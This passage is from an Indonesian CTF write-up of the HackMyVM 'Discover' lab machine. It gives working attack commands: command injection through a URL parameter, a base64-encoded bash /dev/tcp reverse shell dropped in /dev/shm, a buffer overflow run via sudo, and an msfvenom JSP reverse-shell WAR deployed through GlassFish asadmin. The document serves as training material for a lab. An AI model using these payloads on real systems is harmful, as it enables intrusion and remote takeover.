/aboutus2.jpg         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 459074]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]

</code></pre></div></div>
<p>well, saya tidak melihat adanya <em>login page</em> pada output gobuster di atas jadi saya bergerak ke burp suite untuk meng-<em>intercept</em> cara bekerja web yang sedang saya hadapi.</p>

<h2 id="burp-suite-intercepting">burp suite intercepting</h2>

<p><img src="https://i.ibb.co/0DkLDJv/image.png" alt="image" /></p>

<p>well, file <em>php</em> yang sangat tidak wajar, pikir saya. tanpa banyak basa basi saya langsung googling siapa tau bisa mendapatkan source-source di internet atau semacamnya.</p>

<p>dan ternyata, saya menemukannya di <a href="https://github.com/kirubashetty/edutor">repository github</a>.<br />
saat saya mencoba keliling sebentar pada repo tersebut dan saya berfikir bahwa tidak ada yang menarik.</p>

<h2 id="fuzzing-a-subdomain">fuzzing a subdomain</h2>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/discover]
╰─ <span class="nb">cat </span>scan.wfuzz 
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://discover.hmv/
Total requests: 114441

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                                          
<span class="o">=====================================================================</span>

000000541:   200        22 L     51 W       822 Ch      <span class="s2">"log"</span> 
</code></pre></div></div>
<p>terlihat juga pada hasil wfuzz ada satu subdomain yang tercantum, jadi seperti biasa saya nge-save output ini pada file <em>hosts</em>.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/discover]
╰─ <span class="nb">echo</span> <span class="s2">"192.168.56.8 log.discover.hmv"</span> <span class="o">&gt;&gt;</span> /etc/hosts 
</code></pre></div></div>

<h2 id="bruteforcing-subdomain-directory">bruteforcing subdomain directory</h2>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/discover]
╰─ <span class="nb">cat </span>scan_gobuster.2                                                                                                     130 ↵
/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 822]
/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 321] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://log.discover.hmv/manual/]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 281]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 281]

</code></pre></div></div>
<p>hanya ada satu file yang bisa saya percayai, yaitu <em>index.php</em>. selain itu saya tidak yakin apakah bisa membantu saya kedepannya :)</p>

<h2 id="shell-as-www-data">shell as www-data</h2>

<p><img src="https://i.ibb.co/1zTTR3b/screencapture-log-discover-hmv-index-php-2022-09-09-20-08-21.png" alt="file" /></p>

<p>beginilah tampilannya, saya melihat pada tombol <em>submit</em> seperti dibuat sengaja untuk <em>disable</em> lalu saat saya cek sourcenya</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/discover]
╰─ curl <span class="nt">-v</span> log.discover.hmv        
<span class="k">*</span>   Trying 192.168.56.8:80...
<span class="k">*</span> Connected to log.discover.hmv <span class="o">(</span>192.168.56.8<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> GET / HTTP/1.1
<span class="o">&gt;</span> Host: log.discover.hmv
<span class="o">&gt;</span> User-Agent: curl/7.85.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> 
<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Date: Fri, 09 Sep 2022 13:10:14 GMT
&lt; Server: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
&lt; Vary: Accept-Encoding
&lt; Content-Length: 822
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
&lt; 
&lt;html&gt;
  &lt;<span class="nb">head</span><span class="o">&gt;</span>
    &lt;title&gt;Discover login&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:#afafaf;padding:15px;border-radius:20px 20px 0px 0px"</span><span class="o">&gt;</span>
    &lt;/div&gt;
    &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:#c9c9c9;padding:20px;"</span><span class="o">&gt;</span>
      &lt;h1 <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span><span class="o">&gt;</span>Login as Discover&lt;/h1&gt;
    &lt;form <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nv">action</span><span class="o">=</span><span class="s2">"index.php"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"</span><span class="nv">$_GET</span><span class="s2">"</span><span class="o">&gt;</span>
      &lt;label <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span><span class="o">&gt;</span>Username:&lt;/label&gt;&lt;br&gt;
      &lt;input <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Discover"</span><span class="o">&gt;</span>&lt;br&gt;
      &lt;label&gt;Password:&lt;/label&gt;&lt;br&gt;
      &lt;input <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>&lt;br&gt;
    &lt;input <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">disabled</span><span class="o">=</span><span class="s2">"disabled"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Submit"</span><span class="o">&gt;</span>

    &lt;/form&gt;
  &lt;/div&gt;
  &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px"</span> <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span><span class="o">&gt;</span>
      &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
<span class="k">*</span> Connection <span class="c">#0 to host log.discover.hmv left intact</span>
</code></pre></div></div>
<p>pada <em>tag</em> form terdapat satu atribut method menggunakan <em>GET request</em> jadi sudah pasti bisa diprediksi bahwa tidak ada <em>POST request</em> yang bisa ditelusuri lagi karena query tidak bisa diredireksi dan diproses lebih lanjut pada status backend dari web ini. waw, lalu saya pun mencoba <em>LFI</em> dan <em>directory traversal</em> tapi tetap tidak bisa, sebelumnya <em>disable method</em>nya saya hapus agar saya bisa melihat seperti apa <em>GET request</em> bekerja.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">align=</span><span class="s">"center"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>
</code></pre></div></div>
<p><em>output query</em> yang dihasilkan dari request.</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">http</span><span class="p">:</span><span class="c1">//log.discover.hmv/index.php?username=Discover&amp;password=aaaaaaaaaaa</span>

</code></pre></div></div>
<p>tidak ada hasil yang pasti, error message atau semacamnya. memang tampak aneh dan sangat wajar dalam dunia CTF apalagi machine pada difficulty medium.
<em>SSTI</em> sudah saya coba tapi tetap tidak bisa, ya iyalah orang beda franework yang dipakai. lalu saat saya mencoba untuk ngetest command injection dengan command <em>uname -a</em> dengan <em>curl</em> hasilnya akan saya letakkan di bawah ini.</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [machines/discover]
╰─ curl -s 'http://log.discover.hmv/index.php?username=uname+-a<span class="err">&amp;</span>password=aaaaaaaaaaa'
<span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Discover login<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background-color:#afafaf;padding:15px;border-radius:20px 20px 0px 0px"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background-color:#c9c9c9;padding:20px;"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h1</span> <span class="na">align=</span><span class="s">"center"</span><span class="nt">&gt;</span>Login as Discover<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">align=</span><span class="s">"center"</span> <span class="na">action=</span><span class="s">"index.php"</span> <span class="na">method=</span><span class="s">"$_GET"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;label</span> <span class="na">align=</span><span class="s">"center"</span><span class="nt">&gt;</span>Username:<span class="nt">&lt;/label&gt;&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">align=</span><span class="s">"center"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">value=</span><span class="s">"Discover"</span><span class="nt">&gt;&lt;br&gt;</span>
      <span class="nt">&lt;label&gt;</span>Password:<span class="nt">&lt;/label&gt;&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">align=</span><span class="s">"center"</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;&lt;br&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">align=</span><span class="s">"center"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">disabled=</span><span class="s">"disabled"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>

    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px"</span> <span class="na">align=</span><span class="s">"center"</span><span class="nt">&gt;</span>
    Linux debian 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64 GNU/Linux
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>
<p>langsung gercep untuk pasang <em>reverse shell</em> eh ternyata-ternyata~ gagal. payload yang saya masukkan</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"7dOy1%2BT7Hq%2B%2BuiKqhWX4zCvVd8C7LBO%2B"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
</code></pre></div></div>
<p>itu adalah basic rev shell yang berbasis <em>bash</em> dan saya <em>encode</em> menggunakan <em>base64</em>. tetap tidak bisa. lalu saya coba untuk di<em>encode</em> ke <em>URL</em> tetap tidak bisa juga.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/discover]
╰─ python <span class="nt">-c</span> <span class="s1">'import urllib.parse; string = "echo \"7dOy1%2BT7Hq%2B%2BuiKqhWX4zCvVd8C7LBO%2B\" | base64 -d | bash "; print(urllib.parse.quote_plus(string))'</span>
<span class="nb">echo</span>+%227dOy1%252BT7Hq%252B%252BuiKqhWX4zCvVd8C7LBO%252B%22+%7C+base64+-d+%7C+bash

</code></pre></div></div>
<p>lalu saya ganti dalam bentuk script yang dioutputkan ke <em>/tmp</em> tetap sama saja ketika saya eksekusi tidak membuahkan hasil.</p>

<h3 id="devshm---shared-memory">/dev/shm - shared memory</h3>

<p>karena semua directory dalam satu sistem tidak ada yang bisa entah karena apa, maka saya mencoba untuk menaruh file script ke dalam <em>/dev/shm</em> directory agar bisa dieksekusi.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/discover]
╰─ python <span class="nt">-c</span> <span class="s1">'import urllib.parse; string = "echo \"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg==\" | base64 -d &gt; /dev/shm/shell.sh"; print(urllib.parse.quote_plus(string))'</span>
<span class="nb">echo</span>+%22L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg%3D%3D%22+%7C+base64+-d+%3E+%2Fdev%2Fshm%2Fshell.sh
╭─ via <span class="o">[</span>machines/discover]
╰─ curl <span class="nt">-s</span> <span class="s1">'http://log.discover.hmv/index.php?username=echo+%22L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg%3D%3D%22+%7C+base64+-d+%3E+%2Fdev%2Fshm%2Fshell.sh&amp;password=aaaaaaaaaaa'</span>
&lt;html&gt;
  &lt;<span class="nb">head</span><span class="o">&gt;</span>
    &lt;title&gt;Discover login&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:#afafaf;padding:15px;border-radius:20px 20px 0px 0px"</span><span class="o">&gt;</span>
    &lt;/div&gt;
    &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:#c9c9c9;padding:20px;"</span><span class="o">&gt;</span>
      &lt;h1 <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span><span class="o">&gt;</span>Login as Discover&lt;/h1&gt;
    &lt;form <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nv">action</span><span class="o">=</span><span class="s2">"index.php"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"</span><span class="nv">$_GET</span><span class="s2">"</span><span class="o">&gt;</span>
      &lt;label <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span><span class="o">&gt;</span>Username:&lt;/label&gt;&lt;br&gt;
      &lt;input <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Discover"</span><span class="o">&gt;</span>&lt;br&gt;
      &lt;label&gt;Password:&lt;/label&gt;&lt;br&gt;
      &lt;input <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>&lt;br&gt;
    &lt;input <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">disabled</span><span class="o">=</span><span class="s2">"disabled"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Submit"</span><span class="o">&gt;</span>

    &lt;/form&gt;
  &lt;/div&gt;
  &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px"</span> <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span><span class="o">&gt;</span>
      &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
╭─ via <span class="o">[</span>machines/discover]
╰─ python <span class="nt">-c</span> <span class="s1">'import urllib.parse; string = "bash /dev/shm/shell.sh"; print(urllib.parse.quote_plus(string))'</span>              
bash+%2Fdev%2Fshm%2Fshell.sh
╭─ via <span class="o">[</span>machines/discover]
╰─ curl <span class="nt">-s</span> <span class="s2">"http://log.discover.hmv/index.php?username=bash+%2Fdev%2Fshm%2Fshell.sh&amp;password=aaaaaaaaaaa"</span>

<span class="nt">--------------</span>
<span class="nt">----</span> NCAT <span class="nt">----</span>
<span class="nt">--------------</span>

╭─ via <span class="o">[</span>machines/discover]
╰─ ncat <span class="nt">-nvlp</span> 12345
Ncat: Version 7.92 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 192.168.56.8.
Ncat: Connection from 192.168.56.8:33140.
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>475<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@debian:/var/www/html/botdiscover<span class="nv">$ </span>

</code></pre></div></div>
<p>boom!</p>

<h2 id="shell-as-discover">shell as discover</h2>

<p>sebelumnya, saya cek terlebih dahulu ada berapa user di dalam machine ini</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@debian:/var/www/html/botdiscover<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-i</span> sh<span class="nv">$ </span>/etc/passwd
<span class="nb">grep</span> <span class="nt">-i</span> sh<span class="nv">$ </span>/etc/passwd
root:x:0:0:root:/root:/bin/bash
discover:x:1000:1000:discover,,,:/home/discover:/bin/bash
</code></pre></div></div>
<p>ternyata hanya 2, jadi saya tidak perlu repot repot untuk enumeration lebih lanjut.</p>

<p><img src="https://i.ibb.co/6nF2YZB/image.png" alt="image212312" /></p>

<p>saat sudah selesai menjalankan <em>linpeas</em> saya menemukan ini pada <strong>sudo -l</strong>. lalu saat saya cek ternyata memang betul basic overflow yang biasanya ada di acara CTF yang easy-easy itu.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@debian:/opt<span class="nv">$ </span><span class="nb">ls
ls
</span>glassfish6
hint
overflow
www-data@debian:/opt<span class="nv">$ </span><span class="nb">cat </span>hint
<span class="nb">cat </span>hint
AAAAAAAAAAAAAAAAAAAAAAAA<span class="s2">"+"</span><span class="se">\x</span>5d<span class="se">\x</span>06<span class="se">\x</span>40<span class="se">\x</span>00
</code></pre></div></div>
<p>bahkan ada hint-nya, mungkin si creator mikirin partisipan member sini juga ya.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@debian:/opt<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> discover /opt/overflow <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s1">'print("AAAAAAAAAAAAAAAAAAAAAAAA\x5d\x06\x40\x00")'</span><span class="si">)</span>
&lt;print<span class="o">(</span><span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAA</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">00"</span><span class="o">)</span><span class="s1">')
bash: warning: command substitution: ignored null byte in input
/bin/sh: 0: can'</span>t access <span class="nb">tty</span><span class="p">;</span> job control turned off
<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>discover<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>discover<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>discover<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>

</code></pre></div></div>
<h2 id="privilege-escalation">privilege escalation</h2>

<p>setelah membaca cukup lama dokumentasi pada binary <strong>asadmin</strong>, saya menemukan list domain yang dipakai pada port <strong>4848</strong>. tetapi saya tidak tahu pasti <em>credential</em> yang dipakai oleh domain container tersebut, jadi saya membuat domain container dengan akun admin yang baru lagi, lalu memberhentikan <strong>domain1</strong> <em>container</em> dan mencoba menjalankan domain <strong>sharpicx</strong> pada port <strong>4848</strong> lalu mengaktifkan <em>secure admin</em> pada domain <strong>sharpicx</strong>.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>discover@debian:/opt/glassfish6/glassfish/domains<span class="nv">$ </span><span class="nb">sudo</span> /opt/glassfish6/bin/asadmin stop-domain domain1
Waiting <span class="k">for </span>the domain to stop .........
Command stop-domain executed successfully.
discover@debian:/opt/glassfish6/glassfish/domains<span class="nv">$ </span><span class="nb">sudo</span> /opt/glassfish6/bin/asadmin create-domain sharpicx
Enter admin user name <span class="o">[</span>Enter to accept default <span class="s2">"admin"</span> / no password]&gt;sharpicx
Enter the admin password <span class="o">[</span>Enter to accept default of no password]&gt; 
Enter the admin password again&gt; 
Using default port 4848 <span class="k">for </span>Admin.
Using default port 8080 <span class="k">for </span>HTTP Instance.
Using default port 7676 <span class="k">for </span>JMS.
Using default port 3700 <span class="k">for </span>IIOP.
Using default port 8181 <span class="k">for </span>HTTP_SSL.
Using default port 3820 <span class="k">for </span>IIOP_SSL.
Using default port 3920 <span class="k">for </span>IIOP_MUTUALAUTH.
Using default port 8686 <span class="k">for </span>JMX_ADMIN.
Using default port 6666 <span class="k">for </span>OSGI_SHELL.
Using default port 9009 <span class="k">for </span>JAVA_DEBUGGER.
Distinguished Name of the self-signed X.509 Server Certificate is:
<span class="o">[</span><span class="nv">CN</span><span class="o">=</span>debian,OU<span class="o">=</span>GlassFish,O<span class="o">=</span>Eclipse.org Foundation Inc,L<span class="o">=</span>Ottawa,ST<span class="o">=</span>Ontario,C<span class="o">=</span>CA]
Distinguished Name of the self-signed X.509 Server Certificate is:
<span class="o">[</span><span class="nv">CN</span><span class="o">=</span>debian-instance,OU<span class="o">=</span>GlassFish,O<span class="o">=</span>Eclipse.org Foundation Inc,L<span class="o">=</span>Ottawa,ST<span class="o">=</span>Ontario,C<span class="o">=</span>CA]
Domain sharpicx created.
Domain sharpicx admin port is 4848.
Domain sharpicx admin user is <span class="s2">"sharpicx"</span><span class="nb">.</span>
Command create-domain executed successfully.
discover@debian:/opt/glassfish6/glassfish/domains<span class="nv">$ </span><span class="nb">sudo</span> /opt/glassfish6/bin/asadmin start-domain sharpicx
discover@debian:/opt/glassfish6/glassfish/domains<span class="nv">$ </span><span class="nb">sudo</span> /opt/glassfish6/bin/asadmin enable-secure-admin
Enter admin user name&gt;  sharpicx
Enter admin password <span class="k">for </span>user <span class="s2">"sharpicx"</span><span class="o">&gt;</span> 
You must restart all running servers <span class="k">for </span>the change <span class="k">in </span>secure admin to take effect.
Command enable-secure-admin executed successfully.

</code></pre></div></div>
<p>lalu login pada port <strong>4848</strong> dengan <em>credential</em> yang baru saja dibuat, <strong>sharpicx:sharpicx</strong> kemudian saya mencari laman untuk upload <em>reverse shell</em> yang bisa dieksekusi pada laman ini, karena based on <em>Java</em> maka <em>reverse shell</em> yang dipakai <strong>JSP</strong> atau <strong>Java Server Pages</strong> atau bisa juga dengan <em>WAR extension</em> karena termasuk <em>web component</em> pada java web server.</p>

<p>dengan begitu saya membuat <em>revshell</em> menggunakan <strong>msfvenom</strong>.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/discover]
╰─ msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.56.1 <span class="nv">LPORT</span><span class="o">=</span>12345 <span class="nt">-f</span> war <span class="o">&gt;</span> shell.war  
Payload size: 1100 bytes
Final size of war file: 1100 bytes

</code></pre></div></div>
<p>lalu setelah itu, saya mencari-cari laman mana yang bisa digunakan untuk upload <em>revshell</em>. dan ketemulah bagian <em>Applications</em> lalu saya klik <em>Deploy</em> dan disana tidak dibatasi format apa yang harus diakses, jadi saya langsung pasang shell dan upload.</p>

<p><img src="https://i.ibb.co/5j1wDV1/image.png" alt="adasdas" /></p>

<p>lalu balik lagi pada tab <em>Applications</em>, saya klik label <em>launch</em> lalu muncullah tampilan seperti ini.</p>

<p><img src="https://i.ibb.co/DrKSdTC/image.png" alt="asdasdassda" /></p>

<p>lalu saya nyalakan <strong>msfconsole</strong> dan menggunakan <em>multi/handler</em> untuk merespon koneksi TCP dari reverse shellnya. setelah itu saya klik kedua link tersebut dan BOOM!</p>

<p><img src="https://i.ibb.co/BZ7F6jm/image.png" alt="imagesss" /></p>

<h2 id="references">References</h2>
<ul>
  <li><a href="https://www.ibm.com/docs/en/app-connect/11.0.0?topic=corba-naming-service">https://www.ibm.com/docs/en/app-connect/11.0.0?topic=corba-naming-service</a></li>
  <li><a href="https://techcolleague.com/what-is-devshm-and-what-is-it-used-for/">https://techcolleague.com/what-is-devshm-and-what-is-it-used-for/</a></li>
  <li><a href="https://github.com/frizb/MSF-Venom-Cheatsheet">https://github.com/frizb/MSF-Venom-Cheatsheet</a></li>
  <li><a href="https://docs.oracle.com/cd/E26576_01/doc.312/e24938/preface.htm#GSRFM442">https://docs.oracle.com/cd/E26576_01/doc.312/e24938/preface.htm#GSRFM442</a></li>
  <li><a href="https://glassfish.org/docs/latest/reference-manual/asadmin.html">https://glassfish.org/docs/latest/reference-manual/asadmin.html</a></li>
  <li><a href="https://github.com/naivenom/exploiting/blob/master/angstromctf2016/buffer_overflow2.py">https://github.com/naivenom/exploiting/blob/master/angstromctf2016/buffer_overflow2.py</a></li>
  <li><a href="https://0xdf.gitlab.io/2022/01/08/htb-previse.html">https://0xdf.gitlab.io/2022/01/08/htb-previse.html</a></li>
</ul>

  </div>
  <div class="post-info" style="padding-top: 25px">
    <div class="post-date">
      2022-09-09.
    </div>
    <div class="post-categories">
      <span></span>
      
      <a href="/category/hackmyvm" class="post-category">hackmyvm</a>
      
    </div>
    <div class="post-tags">
      <span></span>
      
      <a href="/tag/command-injection" class="post-tag">command-injection</a>
      
      <a href="/tag/basic-overflow" class="post-tag">basic-overflow</a>
      
      <a href="/tag/glassfish" class="post-tag">glassfish</a>
      
      <a href="/tag/msfvenom" class="post-tag">msfvenom</a>
      
    </div>
    <div class="post-tools">
      
      <div>
        <span></span><a href="/2022/10/15/hmv-learn2code">HackMyVM: Learn2Code</a>
      </div>
      
      
      <div>
        <span></span><a href="/2022/05/16/hmv-system">HackMyVM: System</a>
      </div>
      
    </div>
    
  </div>
</article>

    </main>
    <footer class="container-footer">
      <div class="footer-copyright">
  <span class="footer-copyright-text float-left">Copyright &copy; 2022.  sharpicx.</span>
  <span class="footer-copyright-text float-right">
    Powered by <a href="https://jekyllrb.com/">Jekyll</a>
  </span>
</div>

    </footer>
  </div>
</body>
</html>